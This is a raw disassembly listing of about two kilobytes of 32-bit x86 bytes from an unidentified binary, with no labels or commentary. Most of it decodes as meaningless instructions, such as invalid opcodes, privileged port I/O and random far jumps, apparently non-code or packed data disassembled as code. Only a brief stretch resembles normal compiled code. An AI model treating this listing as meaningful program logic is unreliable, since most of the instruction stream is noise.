  40f2e0:	(bad)  
  40f2e1:	outs   dx,BYTE PTR ds:[esi]
  40f2e2:	cs cli 
  40f2e4:	fld    DWORD PTR [ebx]
  40f2e6:	sbb    DWORD PTR [ebp-0x80],0x4c
  40f2ea:	mov    ah,0x17
  40f2ec:	mov    edx,0x9f0c330a
  40f2f1:	dec    ebx
  40f2f2:	adc    DWORD PTR [eax],edi
  40f2f4:	icebp  
  40f2f5:	xor    ch,BYTE PTR [ebx+0x6c]
  40f2f8:	fcmovb st,st(7)
  40f2fa:	test   DWORD PTR [ebp+0x44],ebx
  40f2fd:	lods   eax,DWORD PTR ds:[esi]
  40f2fe:	xor    ch,BYTE PTR [edx-0x6c9997de]
  40f304:	(bad)  [edx]
  40f306:	cmp    cl,ch
  40f308:	adc    edi,DWORD PTR [ecx-0x6d19e4b7]
  40f30e:	pop    es
  40f30f:	push   ss
  40f310:	cmp    eax,0x28b0c53d
  40f315:	outs   dx,BYTE PTR ds:[esi]
  40f316:	dec    ecx
  40f317:	xlat   BYTE PTR ds:[ebx]
  40f318:	fisttp WORD PTR [edi-0x59943516]
  40f31e:	rdpmc  
  40f320:	cwde   
  40f321:	test   ebx,ebp
  40f323:	jecxz  0x40f39c
  40f325:	mov    ebp,0xdbae99fe
  40f32a:	mov    bl,0x0
  40f32c:	fistp  QWORD PTR [edx+esi*8-0x13]
  40f330:	ins    BYTE PTR es:[edi],dx
  40f331:	mov    eax,DWORD PTR [esi+0x7bc4df6e]
  40f337:	pop    ecx
  40f338:	mov    ds:0xae296bb0,eax
  40f33d:	gs repz int3 
  40f340:	jl     0x40f34c
  40f342:	xchg   ebp,eax
  40f343:	push   ds
  40f344:	(bad)  
  40f346:	dec    ebx
  40f347:	mov    ebp,0x5170d989
  40f34c:	arpl   dx,ax
  40f34e:	hlt    
  40f34f:	mov    al,0x5d
  40f351:	add    al,0xf2
  40f353:	push   edx
  40f354:	jge    0x40f346
  40f356:	out    0x6d,al
  40f358:	xor    eax,0x7bf3f8e1
  40f35d:	icebp  
  40f35e:	mov    bl,0xd8
  40f360:	stos   BYTE PTR es:[edi],al
  40f361:	nop
  40f362:	cmp    eax,esp
  40f364:	push   cs
  40f365:	lods   eax,DWORD PTR ds:[esi]
  40f366:	clc    
  40f367:	adc    DWORD PTR ds:0x56362d38,0xf66253a4
  40f371:	fiadd  WORD PTR [eax+0x7ddc1c61]
  40f377:	xchg   ebx,eax
  40f378:	fnstcw WORD PTR [esi-0x38]
  40f37b:	and    eax,0x387af3a1
  40f380:	jo     0x40f366
  40f382:	dec    eax
  40f383:	inc    esp
  40f384:	ins    BYTE PTR es:[edi],dx
  40f385:	popa   
  40f386:	addr16 mov esp,0x6df20d82
  40f38c:	sbb    cl,BYTE PTR [ecx-0xc]
  40f38f:	mov    ds:0x950a24e3,eax
  40f394:	hlt    
  40f395:	fsub   DWORD PTR [ecx-0x59]
  40f398:	jmp    0x4ea6f446
  40f39d:	lock cli 
  40f39f:	dec    edx
  40f3a0:	pop    esp
  40f3a1:	lds    esi,FWORD PTR [ebp-0x3c]
  40f3a4:	xor    BYTE PTR [ecx+0x2b36e5d2],bl
  40f3aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3ab:	fs jbe 0x40f423
  40f3ae:	add    cl,BYTE PTR [ebp-0x38251b09]
  40f3b4:	mov    esp,0xf2eb740
  40f3b9:	push   ebx
  40f3ba:	xchg   edx,eax
  40f3bb:	jg     0x40f3da
  40f3bd:	mov    ds:0x7f5fc007,eax
  40f3c2:	test   BYTE PTR [eax],cl
  40f3c4:	xchg   eax,esp
  40f3c6:	and    DWORD PTR [ebp-0x11942090],edi
  40f3cc:	cli    
  40f3cd:	les    ebp,FWORD PTR [ecx-0x61]
  40f3d0:	inc    DWORD PTR [ebx-0x47]
  40f3d3:	push   edi
  40f3d4:	xchg   DWORD PTR [eax-0x51],edi
  40f3d7:	sbb    ecx,DWORD PTR [ebx+0x2b2c76fd]
  40f3dd:	jl     0x40f3f3
  40f3df:	test   BYTE PTR [ebp+0x1cea9115],0x47
  40f3e6:	or     ebx,eax
  40f3e8:	out    0x54,al
  40f3ea:	test   eax,0x8aaaca69
  40f3ef:	pop    es
  40f3f0:	aaa    
  40f3f1:	(bad)  
  40f3f3:	inc    ebx
  40f3f4:	stc    
  40f3f5:	test   DWORD PTR [edi+0x294bbc39],0x46882083
  40f3ff:	sub    al,BYTE PTR [ebp+0x71a5dfef]
  40f405:	push   ebx
  40f406:	lods   eax,DWORD PTR ds:[esi]
  40f407:	out    dx,al
  40f408:	loope  0x40f3e0
  40f40a:	test   BYTE PTR [eax-0x45132bb9],dl
  40f410:	adc    eax,0xbb1fa1f3
  40f415:	gs adc eax,0x2dc378c0
  40f41b:	mov    DWORD PTR [esi-0x4bda177e],edi
  40f421:	cwde   
  40f422:	lods   al,BYTE PTR ds:[esi]
  40f423:	call   0xa6ec:0xc629dfb4
  40f42a:	aam    0x7f
  40f42c:	fcomp  QWORD PTR [eax+0x6cf269d7]
  40f432:	jmp    0x63be5b77
  40f437:	and    ah,BYTE PTR [ecx+0x49]
  40f43a:	inc    esi
  40f43b:	jo     0x40f3c9
  40f43d:	mov    edx,0x6a2f3233
  40f442:	sub    BYTE PTR [edx],bl
  40f444:	stc    
  40f445:	and    eax,0x85c601a3
  40f44a:	mov    cl,0x28
  40f44c:	in     eax,dx
  40f44d:	jb     0x40f4c0
  40f44f:	icebp  
  40f450:	xor    DWORD PTR [esi+0x2b],ebp
  40f453:	neg    BYTE PTR [esi-0x576cdc1d]
  40f459:	cmc    
  40f45a:	or     BYTE PTR [ecx],dh
  40f45c:	or     ebp,DWORD PTR [ecx+edx*1]
  40f45f:	cld    
  40f460:	mov    al,0xa
  40f462:	fcomp  DWORD PTR [ecx]
  40f464:	jg     0x40f4a7
  40f466:	les    edx,FWORD PTR [edi]
  40f468:	mov    ah,0xb
  40f46a:	pusha  
  40f46b:	sbb    DWORD PTR [ebp+0x5a3e7bb2],0xe5b90b62
  40f475:	pop    edx
  40f476:	test   eax,0x9f77cdab
  40f47b:	sub    al,BYTE PTR [edi+ecx*2+0x47]
  40f47f:	mov    DWORD PTR [edx-0x5],esp
  40f482:	fcom   DWORD PTR [edi]
  40f484:	adc    al,0xc7
  40f486:	or     BYTE PTR [edi-0x36],bl
  40f489:	(bad)  
  40f48a:	mov    eax,0x25f42df7
  40f48f:	push   0xee81176e
  40f494:	mov    dh,0xda
  40f496:	or     DWORD PTR [ebp+0x3ed8dd1a],ecx
  40f49c:	arpl   WORD PTR [edi],cx
  40f49e:	mov    ds:0x81776ce7,al
  40f4a3:	ins    DWORD PTR es:[edi],dx
  40f4a4:	jno    0x40f499
  40f4a6:	pop    eax
  40f4a7:	xchg   ebp,eax
  40f4a8:	fcomp  QWORD PTR ds:0xdbf84388
  40f4ae:	shl    BYTE PTR [eax],cl
  40f4b0:	sbb    eax,0xd957c893
  40f4b5:	adc    DWORD PTR [ebx],edi
  40f4b7:	fs faddp st(0),st
  40f4ba:	sub    ebx,0x64
  40f4bd:	sub    BYTE PTR [edi+0xedf470a],bh
  40f4c3:	and    eax,0xf8034e02
  40f4c8:	daa    
  40f4c9:	push   cs
  40f4ca:	ret    
  40f4cb:	enter  0x5754,0x57
  40f4cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4d0:	and    BYTE PTR [edx],ch
  40f4d2:	sbb    edx,ebx
  40f4d4:	cmp    al,0x6a
  40f4d6:	leave  
  40f4d7:	push   ss
  40f4d8:	out    dx,al
  40f4d9:	call   0x90ca:0xbb0b1b15
  40f4e0:	jbe    0x40f502
  40f4e2:	push   ecx
  40f4e3:	pop    DWORD PTR [ecx+0x6b]
  40f4e6:	and    esi,0xffffffb7
  40f4e9:	imul   eax,ebp,0xe8cc85a5
  40f4ef:	neg    DWORD PTR [edi]
  40f4f1:	call   0xc287ac0c
  40f4f6:	add    al,0x80
  40f4f8:	in     al,dx
  40f4f9:	js     0x40f511
  40f4fb:	push   eax
  40f4fc:	sub    eax,0x88e7720e
  40f501:	xchg   edx,eax
  40f502:	fcomip st,st(6)
  40f504:	mov    dh,0xc8
  40f506:	pop    ss
  40f507:	ds pop eax
  40f509:	mov    ebx,DWORD PTR [edi-0x7609cc01]
  40f50f:	dec    ebp
  40f510:	in     al,dx
  40f511:	mov    eax,DWORD PTR [ebp-0x28]
  40f514:	jmp    0x40f908
  40f519:	sbb    al,0x75
  40f51b:	sar    DWORD PTR [esi+0x71b35a51],1
  40f521:	lahf   
  40f522:	popa   
  40f523:	sti    
  40f524:	arpl   cx,ax
  40f526:	or     BYTE PTR [edi+0x70afb68c],dl
  40f52c:	jo     0x40f577
  40f52e:	jge    0x40f5a0
  40f530:	jo     0x40f4da
  40f532:	pushf  
  40f533:	mov    WORD PTR [esi],ds
  40f535:	into   
  40f536:	fbstp  TBYTE PTR [esi]
  40f538:	mov    edi,0xd253495d
  40f53d:	sub    ah,BYTE PTR [ebx+0x99d15f2]
  40f543:	js     0x40f5c1
  40f545:	dec    esp
  40f546:	mov    al,0x30
  40f548:	cmp    al,0x4c
  40f54a:	pop    ebx
  40f54b:	bnd jbe 0x40f534
  40f54e:	mov    edi,0xd82bdbd4
  40f553:	fnstenv [eax+eiz*4]
  40f556:	test   al,0x21
  40f558:	push   esi
  40f559:	rcl    BYTE PTR [ecx],1
  40f55b:	add    al,0x39
  40f55d:	popa   
  40f55e:	mov    eax,0xfa852e22
  40f563:	or     BYTE PTR [edi],ch
  40f565:	push   ebp
  40f566:	mov    esp,eax
  40f568:	jnp    0x40f59f
  40f56a:	sbb    esi,ebx
  40f56c:	pop    esp
  40f56d:	fstp   DWORD PTR [eax-0x2975f75e]
  40f573:	lahf   
  40f574:	neg    DWORD PTR [eax-0x15]
  40f577:	(bad)  
  40f579:	pusha  
  40f57a:	push   ds
  40f57b:	pusha  
  40f57c:	jmp    0x40f56d
  40f57e:	mov    esi,0x3f353eb2
  40f583:	jmp    FWORD PTR ds:0xe4fcada6
  40f589:	jmp    0x7992:0x7dd46084
  40f590:	test   al,0x27
  40f592:	ds xor bh,cl
  40f595:	xchg   BYTE PTR [edi+ecx*4+0x25],bl
  40f599:	adc    al,0xbe
  40f59b:	hlt    
  40f59c:	sar    cl,1
  40f59e:	outs   dx,DWORD PTR ds:[esi]
  40f59f:	sbb    eax,0xc9bd1c25
  40f5a4:	and    eax,0xbfc213a4
  40f5a9:	and    cl,BYTE PTR [esp+edx*2]
  40f5ac:	fidiv  DWORD PTR [eax+0x72823c6a]
  40f5b2:	addr16 mov al,0x35
  40f5b5:	jb     0x40f5b2
  40f5b7:	clc    
  40f5b8:	add    dh,BYTE PTR [ebp+0xfb0f235]
  40f5be:	dec    esp
  40f5bf:	call   0x6577:0x3b1b9773
  40f5c6:	adc    eax,0x5ec059f7
  40f5cb:	cmp    eax,0xe9b0fbc9
  40f5d0:	rcr    esp,0xd8
  40f5d3:	(bad)  
  40f5d5:	sahf   
  40f5d6:	cmp    ebx,edx
  40f5d8:	add    DWORD PTR [edi],ebx
  40f5da:	mov    ds:0xaee79deb,ax
  40f5e0:	test   al,cl
  40f5e2:	sub    al,ah
  40f5e4:	inc    esp
  40f5e5:	fsubr  DWORD PTR [edx+0x7b911f06]
  40f5eb:	push   esi
  40f5ec:	add    BYTE PTR [ecx-0x704c2b37],ch
  40f5f2:	xchg   esi,eax
  40f5f3:	ja     0x40f607
  40f5f5:	inc    ebx
  40f5f6:	mov    bh,0xb7
  40f5f8:	or     bl,BYTE PTR [ecx]
  40f5fa:	(bad)  
  40f5fb:	pop    ebp
  40f5fc:	add    al,ah
  40f5fe:	(bad)  
  40f5ff:	icebp  
  40f600:	inc    edx
  40f601:	dec    eax
  40f602:	jb     0x40f5be
  40f604:	cdq    
  40f605:	inc    ebx
  40f606:	mov    DWORD PTR [esp+esi*8-0x49],ecx
  40f60a:	aad    0x25
  40f60c:	pusha  
  40f60d:	ss mov eax,0x2f499de4
  40f613:	push   eax
  40f614:	jae    0x40f621
  40f616:	mov    eax,ds:0xbe5e1ed4
  40f61b:	leave  
  40f61c:	cmp    al,0x55
  40f61e:	dec    ebx
  40f61f:	in     al,0x65
  40f621:	(bad)  [eax+0x1cee25bc]
  40f627:	mov    DWORD PTR [edx+edi*1],edi
  40f62a:	xor    DWORD PTR [ebx+esi*8-0x480a99e8],ecx
  40f631:	or     edi,esi
  40f633:	push   esp
  40f634:	dec    ecx
  40f635:	or     DWORD PTR [ecx+0x41],0xd28c0fa0
  40f63c:	in     al,0x3a
  40f63e:	pop    ss
  40f63f:	test   ebp,ebp
  40f641:	(bad)  
  40f642:	aaa    
  40f643:	cmp    edi,DWORD PTR ds:0x1472fca
  40f649:	adc    BYTE PTR [ebx-0x6a],ch
  40f64c:	inc    edx
  40f64d:	mov    esp,0x7916db6e
  40f652:	lods   al,BYTE PTR ds:[esi]
  40f653:	loop   0x40f6c8
  40f655:	addr16 std 
  40f657:	not    DWORD PTR [edx]
  40f659:	push   esi
  40f65a:	fs (bad) 
  40f65c:	jl     0x40f6ad
  40f65e:	cli    
  40f65f:	je     0x40f64d
  40f661:	xchg   ebx,eax
  40f662:	aas    
  40f663:	pop    es
  40f664:	shr    DWORD PTR [esi],cl
  40f666:	sub    bh,BYTE PTR [edx-0x42]
  40f669:	dec    ecx
  40f66a:	jne    0x40f694
  40f66c:	mov    esi,0x42b3de07
  40f671:	not    BYTE PTR [edi-0x12d7824d]
  40f677:	call   0x2d059b1b
  40f67c:	mov    eax,0x4fdbb53f
  40f681:	sbb    BYTE PTR [eax-0x4e],0xbb
  40f685:	mov    al,ds:0xe75b11d2
  40f68a:	jmp    0x64af:0x62dcbf00
  40f691:	mov    dh,0xc8
  40f693:	xlat   BYTE PTR ds:[ebx]
  40f694:	inc    eax
  40f695:	xchg   edx,eax
  40f696:	mov    al,ds:0x3562f63f
  40f69b:	xlat   BYTE PTR ss:[ebx]
  40f69d:	push   edi
  40f69e:	out    dx,eax
  40f69f:	ror    dh,cl
  40f6a1:	not    BYTE PTR [esi-0x46b92fea]
  40f6a7:	sbb    dl,BYTE PTR [eax+0x2c]
  40f6aa:	push   ss
  40f6ab:	out    0xfc,al
  40f6ad:	leave  
  40f6ae:	pop    ebp
  40f6af:	pop    ebp
  40f6b0:	(bad)  
  40f6b2:	cli    
  40f6b3:	push   eax
  40f6b4:	push   edi
  40f6b5:	jge    0x40f725
  40f6b7:	aam    0x12
  40f6b9:	ins    BYTE PTR es:[edi],dx
  40f6ba:	rcr    DWORD PTR [edi+0x48],cl
  40f6bd:	xchg   edx,eax
  40f6be:	mov    ds:0xf5103c2,eax
  40f6c3:	stc    
  40f6c4:	int    0x34
  40f6c6:	pop    ss
  40f6c7:	daa    
  40f6c8:	(bad)  
  40f6c9:	popa   
  40f6ca:	loope  0x40f69c
  40f6cc:	js     0x40f65d
  40f6ce:	sbb    al,0x21
  40f6d0:	sbb    al,0x14
  40f6d2:	jle    0x40f710
  40f6d4:	fnstcw WORD PTR [edi]
  40f6d6:	mov    eax,ds:0x2d73b143
  40f6db:	pop    esp
  40f6dc:	adc    al,0x81
  40f6de:	jnp    0x40f725
  40f6e0:	test   eax,0x47fefbb5
  40f6e5:	xchg   edx,eax
  40f6e6:	cli    
  40f6e7:	push   esi
  40f6e8:	neg    DWORD PTR [ebp+0x7031fa62]
  40f6ee:	sti    
  40f6ef:	cmp    DWORD PTR [edx*2-0x62844b4c],ebp
  40f6f6:	sahf   
  40f6f7:	mov    eax,ds:0x8adeb51a
  40f6fc:	or     ebx,DWORD PTR [ebp+ebp*8+0x7e]
  40f700:	lock sbb eax,0xfa1c01f8
  40f706:	sub    ebx,DWORD PTR [esi+0x33]
  40f709:	in     al,dx
  40f70a:	pop    esp
  40f70b:	sar    BYTE PTR [ecx+0x6a],0x44
  40f70f:	push   edi
  40f710:	push   ebx
  40f711:	sbb    ebp,esp
  40f713:	adc    ch,BYTE PTR [edx]
  40f715:	leave  
  40f716:	xchg   BYTE PTR [edi-0x7c],bl
  40f719:	mov    ebx,0x42b0e00d
  40f71e:	imul   ebp,DWORD PTR [edi-0x55813df1],0xffffff88
  40f725:	test   eax,0x4b663996
  40f72a:	mov    edx,es
  40f72c:	lock aam 0x63
  40f72f:	mov    edi,0x7a55de9f
  40f734:	pop    esi
  40f735:	jp     0x40f720
  40f737:	sbb    BYTE PTR [esi+0x5fd56a3f],bl
  40f73d:	fisttp WORD PTR [esi+0x20]
  40f740:	cli    
  40f741:	imul   ebx,ebp,0x46
  40f744:	pop    es
  40f745:	cmp    eax,0xaadc317b
  40f74a:	dec    eax
  40f74b:	pop    edi
  40f74c:	mov    ebp,0x39bb408c
  40f751:	fisttp DWORD PTR [edi+0x3f089eef]
  40f757:	mov    dh,0xdb
  40f759:	push   ebp
  40f75a:	scas   eax,DWORD PTR es:[edi]
  40f75b:	(bad)
  40f75e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f75f:	stos   DWORD PTR es:[edi],eax
  40f760:	mov    DWORD PTR [esi],edx
  40f762:	fistp  QWORD PTR [ecx-0x5d72f1c7]
  40f768:	test   eax,0x18531b3d
  40f76d:	test   DWORD PTR [edx-0x2a],ebx
  40f770:	xor    DWORD PTR [edx+0x44],eax
  40f773:	int    0xd4
  40f775:	shl    BYTE PTR [ebp+0x58fc98d8],cl
  40f77b:	rcl    BYTE PTR ds:0xfb6d29d9,0x69
  40f782:	jl     0x40f761
  40f784:	mov    eax,ds:0xb1e1f014
  40f789:	xchg   ebx,eax
  40f78a:	sub    esi,edx
  40f78c:	inc    ebx
  40f78d:	lods   al,BYTE PTR es:[esi]
  40f78f:	lea    ecx,[ebx-0xe]
  40f792:	inc    edx
  40f793:	push   esi
  40f794:	scas   eax,DWORD PTR es:[edi]
  40f795:	pop    es
  40f796:	ret    0x8458
  40f799:	xor    eax,0x2baf0e7e
  40f79e:	addr16 out dx,al
  40f7a0:	jns    0x40f7d2
  40f7a2:	mov    ah,0xcb
  40f7a4:	cld    
  40f7a5:	sub    al,ch
  40f7a7:	cdq    
  40f7a8:	lahf   
  40f7a9:	out    dx,al
  40f7aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7ab:	xchg   ebx,eax
  40f7ac:	call   0x20a34cf2
  40f7b1:	add    eax,ecx
  40f7b3:	sbb    BYTE PTR [ecx+0x41],ah
  40f7b6:	inc    esi
  40f7b7:	sub    eax,esi
  40f7b9:	adc    eax,ebx
  40f7bb:	imul   ecx,DWORD PTR [esi-0x7fb7bdbd],0xe11f59db
  40f7c5:	xchg   edi,eax
  40f7c6:	adc    al,0x18
  40f7c8:	or     ebp,DWORD PTR [edi+ecx*1-0x57872629]
  40f7cf:	clc    
  40f7d0:	and    al,0xc9
  40f7d2:	leave  
  40f7d3:	dec    ebp
  40f7d4:	push   es
  40f7d5:	cwde   
  40f7d6:	dec    edi
  40f7d7:	mov    cl,BYTE PTR [esi-0x14]
  40f7da:	pop    esi
  40f7db:	lods   eax,DWORD PTR ds:[esi]
  40f7dc:	sahf   
  40f7dd:	inc    esi
  40f7de:	jo     0x40f799
  40f7e0:	add    BYTE PTR [edi+0x7c07e485],ch
  40f7e6:	jb     0x40f7f2
  40f7e8:	push   edi
  40f7e9:	sbb    eax,DWORD PTR [edx+0x10fd6c6c]
  40f7ef:	jmp    eax
  40f7f1:	sub    al,0xae
  40f7f3:	popf   
  40f7f4:	neg    BYTE PTR [edx+0x3185bccd]
  40f7fa:	and    esp,DWORD PTR [esi-0x78a01916]
  40f800:	outs   dx,DWORD PTR ds:[esi]
  40f801:	pop    esp
  40f802:	inc    ecx
  40f803:	pop    DWORD PTR [eax]
  40f805:	mov    edi,0x71436c90
  40f80a:	jle    0x40f7b8
  40f80c:	not    DWORD PTR [ebx+eiz*4-0x7c1717c5]
  40f813:	out    0xc1,al
  40f815:	fdivrp st(4),st
  40f817:	cmp    ebp,DWORD PTR [ebp-0x4]
  40f81a:	cwde   
  40f81b:	mov    ecx,0xc71ebf30
  40f820:	aaa    
  40f821:	push   0x4c
  40f823:	sbb    bh,BYTE PTR [edx]
  40f825:	rcl    dl,0x0
  40f828:	fs dec edi
  40f82a:	add    dl,BYTE PTR [esp+ebp*1+0x43f16b13]
  40f831:	iret   
  40f832:	adc    dl,BYTE PTR [ebx-0x1a6aedb5]
  40f838:	ror    DWORD PTR [esi+0x30],0x48
  40f83c:	popa   
  40f83d:	fisttp WORD PTR [edi]
  40f83f:	addr16 adc ecx,esi
  40f842:	pop    edi
  40f843:	mov    al,ds:0xe48aba4d
  40f849:	adc    BYTE PTR [edi+ebx*4-0x3],ch
  40f84d:	sub    esi,esi
  40f84f:	push   DWORD PTR [esi+0x12b4a696]
  40f855:	xchg   ebx,eax
  40f856:	mov    edx,0x328c7243
  40f85b:	stc    
  40f85c:	or     DWORD PTR [ebx-0x3c3c23a9],0x2a
  40f863:	and    al,0xb9
  40f865:	in     al,dx
  40f866:	sub    ebp,esi
  40f868:	and    esi,DWORD PTR [edx-0x7e]
  40f86b:	push   ebp
  40f86c:	add    BYTE PTR [esi+ebx*8-0x61c8ad54],bh
  40f873:	cwde   
  40f874:	push   esp
  40f875:	or     DWORD PTR [edx+0x1d59ad4a],0xe85852c4
  40f87f:	jne    0x40f827
  40f881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f882:	addr16 pop ebp
  40f884:	popa   
  40f885:	mov    DWORD PTR [ebx-0x31e62073],eax
  40f88b:	xchg   edi,eax
  40f88c:	jno    0x40f8c9
  40f88e:	in     eax,dx
  40f88f:	imul   esi,DWORD PTR [esi+0x9],0xffffffdc
  40f893:	cmp    al,0x6c
  40f895:	mov    ds:0x954b7769,eax
  40f89a:	bound  edx,QWORD PTR [esi]
  40f89c:	cmp    DWORD PTR [eax-0x6982c2be],esp
  40f8a2:	and    BYTE PTR [edi-0x65],ah
  40f8a5:	cmp    ebp,DWORD PTR [ecx]
  40f8a7:	stos   DWORD PTR es:[edi],eax
  40f8a8:	popa   
  40f8a9:	out    dx,al
  40f8aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8ab:	mov    ecx,DWORD PTR [ebx+ecx*1+0x43]
  40f8af:	ret    0x1b8b
  40f8b2:	mov    esp,0xb3ba4456
  40f8b7:	repz scas al,BYTE PTR es:[edi]
  40f8b9:	ret    
  40f8ba:	fcomi  st,st(0)
  40f8bc:	push   edi
  40f8bd:	(bad)  
  40f8be:	mov    edx,0xea0268e6
  40f8c3:	pop    ds
  40f8c4:	sbb    ch,cl
  40f8c6:	retf   0x6994
  40f8c9:	push   esp
  40f8ca:	mov    dl,0xe0
  40f8cc:	repnz mov cl,0xce
  40f8cf:	loope  0x40f920
  40f8d1:	rcr    DWORD PTR [edi],cl
  40f8d3:	call   0x6548:0x60b35c93
  40f8da:	ficom  WORD PTR [ebx+0x440689a2]
  40f8e0:	push   edx
  40f8e1:	sub    eax,0x7eb69cc4
  40f8e6:	test   al,0x88
  40f8e8:	dec    eax
  40f8e9:	jg     0x40f8c4
  40f8eb:	inc    ebx
  40f8ec:	retf   
  40f8ed:	enter  0xf573,0x2b
  40f8f1:	mov    ds,WORD PTR [ebx]
  40f8f3:	in     al,0x6a
  40f8f5:	stos   BYTE PTR es:[edi],al
  40f8f6:	jge    0x40f8d1
  40f8f8:	inc    esi
  40f8f9:	aad    0x59
  40f8fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8fc:	push   ecx
  40f8fd:	xchg   ebx,eax
  40f8fe:	call   0x638d:0xe52df232
  40f905:	add    BYTE PTR [ebp+0x84d8bbb],bh
  40f90b:	add    ecx,DWORD PTR [eax+edi*4]
  40f90e:	lea    eax,[ebp-0x8]
  40f911:	mov    DWORD PTR [ebp-0x30],ecx
  40f914:	push   eax
  40f915:	push   DWORD PTR [ebp-0x30]
  40f918:	push   DWORD PTR [ebp+0xc]
  40f91b:	call   0x403925
  40f920:	mov    eax,DWORD PTR [ebp-0x4]
  40f923:	mov    ecx,DWORD PTR [ebp-0x8]
  40f926:	jmp    0x40fd1a
  40f92b:	or     DWORD PTR ds:[edi],eax
  40f92e:	(bad)  
  40f92f:	rcl    edx,cl
  40f931:	cmp    DWORD PTR [ecx],edx
  40f933:	pop    ecx
  40f934:	jns    0x40f901
  40f936:	popa   
  40f937:	xlat   BYTE PTR ds:[ebx]
  40f938:	xchg   DWORD PTR [ebx],ebx
  40f93a:	adc    cl,BYTE PTR [edi+0x497070ab]
  40f940:	jge    0x40f9b2
  40f942:	jo     0x40f920
  40f944:	adc    DWORD PTR [ebx+0x18],ebp
  40f947:	loopne 0x40f925
  40f949:	jo     0x40f949
  40f94b:	imul   ebx,ecx,0xffffff90
  40f94e:	js     0x40f954
  40f950:	addr16 xor al,dl
  40f953:	mov    ah,0x4b
  40f955:	inc    ebx
  40f956:	cmp    DWORD PTR [ecx-0x80],ebx
  40f959:	pop    ecx
  40f95a:	add    al,BYTE PTR ds:0xb04cd64d
  40f960:	idiv   dl
  40f962:	jle    0x40f9be
  40f964:	xchg   edi,eax
  40f965:	mov    eax,edx
  40f967:	icebp  
  40f968:	mov    ch,ch
  40f96a:	in     al,dx
  40f96b:	shl    cl,cl
  40f96d:	fstp   QWORD PTR [edx-0x665fcb4c]
  40f973:	mov    ds:0x6733a34,al
  40f978:	mov    ch,0x2f
  40f97a:	add    ebx,DWORD PTR [ecx]
  40f97c:	pop    ebx
  40f97d:	std    
  40f97e:	jmp    0x40f912
  40f980:	jle    0x40f95c
  40f982:	push   ebp
  40f983:	jle    0x40f93c
  40f985:	loop   0x40f913
  40f987:	xchg   ecx,eax
  40f988:	xchg   BYTE PTR [ebp-0x4],bh
  40f98b:	and    eax,0xfff51159
  40f990:	mov    BYTE PTR [edx+0x647f5bc1],bh
  40f996:	ror    DWORD PTR ds:0x611ed778,1
  40f99c:	xor    eax,0x2a8729c8
  40f9a1:	jge    0x40f92c
  40f9a3:	or     BYTE PTR [esi-0xc6c9bfb],0xc
  40f9aa:	mov    ds:0x2d90273f,eax
  40f9af:	ret    
  40f9b0:	lds    edx,FWORD PTR [edx+edx*2]
  40f9b3:	cmp    esp,0xbb6b4cfc
  40f9b9:	icebp  
  40f9ba:	ss xor eax,0x84e21d09
  40f9c0:	push   ds
  40f9c1:	dec    esp
  40f9c3:	nop
  40f9c4:	dec    esi
  40f9c5:	cmp    ch,bl
  40f9c7:	es xchg ecx,eax
  40f9c9:	out    0xeb,al
  40f9cb:	fcomp  DWORD PTR [ebp+0x5265beaa]
  40f9d1:	sbb    ebx,DWORD PTR [ebp-0x6e]
  40f9d4:	(bad)  
  40f9d5:	popf   
  40f9d6:	jmp    0x40f98a
  40f9d8:	xor    dl,cl
  40f9da:	mov    dh,0x78
  40f9dc:	(bad)  
  40f9dd:	pop    edi
  40f9de:	test   al,0x84
  40f9e0:	sub    BYTE PTR [ebx-0x3b6b11ca],0xa9
  40f9e7:	push   eax
  40f9e8:	jg     0x40f9a6
  40f9ea:	outs   dx,BYTE PTR ds:[esi]
  40f9eb:	sub    DWORD PTR [edi-0x492ff3d1],ecx
  40f9f1:	ret    
  40f9f2:	or     eax,0x897dee31
  40f9f7:	aad    0x3
  40f9f9:	call   0xcc247f68
  40f9fe:	ja     0x40f9f7
  40fa00:	out    dx,al
  40fa01:	enter  0x634b,0x1e
  40fa05:	int    0x92
  40fa07:	pusha  
  40fa08:	jmp    0x40f9c2
  40fa0a:	(bad)  
  40fa0b:	sbb    bl,BYTE PTR [eax+0x64]
  40fa0e:	mov    esi,0xc0fdd67b
  40fa13:	mov    edi,0xf4a741a7
  40fa18:	loopne 0x40fa59
  40fa1a:	jns    0x40f9e9
  40fa1c:	mov    BYTE PTR [eax-0x28b9afbf],bh
  40fa22:	xchg   ecx,eax
  40fa23:	ds push 0x77
  40fa26:	mov    dl,0x40
  40fa28:	inc    eax
  40fa29:	clc    
  40fa2a:	aas    
  40fa2b:	sub    dh,bh
  40fa2d:	pop    eax
  40fa2e:	jp     0x40f9fe
  40fa30:	aaa    
  40fa31:	sub    edi,DWORD PTR [ebp+ebp*1-0x26]
  40fa35:	push   edi
  40fa36:	mov    edi,0xe99a814f
  40fa3b:	imul   ecx,DWORD PTR [ecx],0x8a3cfa7c
  40fa41:	mov    ebp,0x17985385
  40fa46:	retf   0xf474
  40fa49:	mov    eax,ds:0x29eaf7c
  40fa4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa4f:	sub    al,0xbb
  40fa51:	push   esp
  40fa52:	mov    bl,0xbf
  40fa54:	in     eax,dx
  40fa55:	retf   0xc121
  40fa58:	add    eax,0x5fafe3df
  40fa5d:	xchg   BYTE PTR [ecx+edi*2],bl
  40fa60:	cmp    BYTE PTR [esi+0x16e6349b],0xe2
  40fa67:	adc    DWORD PTR [eax+esi*2],eax
  40fa6a:	in     eax,dx
  40fa6b:	push   ecx
  40fa6c:	shl    ah,0x15
  40fa6f:	dec    ebx
  40fa70:	test   al,0x7a
  40fa72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa73:	mov    edx,0x287e353b
  40fa78:	iret   
  40fa79:	outs   dx,BYTE PTR ds:[esi]
  40fa7a:	adc    eax,DWORD PTR [edx]
  40fa7c:	or     al,0xf1
  40fa7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa7f:	sbb    DWORD PTR [edi],esi
  40fa81:	mov    dl,0xbf
  40fa83:	or     BYTE PTR [edi-0x60c4056c],ah
  40fa89:	jg     0x40faf0
  40fa8b:	stos   BYTE PTR es:[edi],al
  40fa8c:	js     0x40fa4a
  40fa8e:	dec    esp
  40fa8f:	inc    esp
  40fa90:	or     edx,edi
